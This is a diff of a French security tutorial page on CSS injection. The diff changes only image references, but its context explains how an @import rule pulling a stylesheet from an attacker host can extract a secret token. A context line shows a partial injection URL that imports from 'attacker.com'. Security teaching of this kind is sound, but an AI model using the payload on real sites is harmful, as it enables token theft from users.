@@ -84,7 +84,7 @@ https://vulnerable.com/regle-import.php?css=@import%20url(https://attacker.com/s
 
 Lorsque la victime visite la page injectée, son navigateur effectue la requête permettant de charger la feuille de style importée :&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 En admettant que le contenu de la feuille de style malicieuse n'effectue seulement qu'un changement de couleur du titre :&#x20;
 
@@ -98,7 +98,7 @@ h1 {
 
 La victime verra donc ainsi l'application du style CSS :&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Pour l'attaquant, l'idée ici sera d'utiliser la feuille de style CSS sous son contrôle afin d'exécuter les attaques vues précédemment, mais sans avoir besoin d'iframer le site vulnérable ou de passer plusieurs fois des liens malicieux à sa victime (un premier lien pour identifier le premier caractère, un second lien pour le second caractère, etc).
 
@@ -186,7 +186,7 @@ Le principe de l'automatisation de l'exploitation est le suivant :&#x20;
 
 Soit le diagramme suivant (se répétant jusqu'à ce que la totalité du jeton soit récupéré) :&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 En théorie cela fonctionne, mais en pratique, plusieurs problématiques restent à régler avec que cela fonctionne.
 
